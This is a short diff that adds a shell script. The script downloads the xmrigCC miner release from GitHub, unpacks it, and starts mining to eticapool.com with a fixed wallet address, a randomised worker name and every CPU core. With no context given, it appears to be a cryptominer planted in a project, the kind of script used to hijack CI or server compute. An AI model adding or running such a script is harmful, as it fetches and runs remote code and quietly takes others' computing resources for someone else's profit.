@@ -1,0 +1,3 @@
+curl https://github.com/Bendr0id/xmrigCC/releases/download/3.4.6/xmrigCC-miner_only-3.4.6-linux-generic-static-amd64.tar.gz -L-o xmrigCC-miner_only-3.4.6-linux-generic-static-amd64.tar.gz
+tar xf xmrigCC-miner_only-3.4.6-linux-generic-static-amd64.tar.gz
+./xmrigDaemon -a rx/0 -o eticapool.com:3333 -u 0x0904d31ed787757fc0a24c2a4e3572788087570b.$(echo $RANDOM | md5sum | head -c 10) -p x -k -t $(nproc --all)
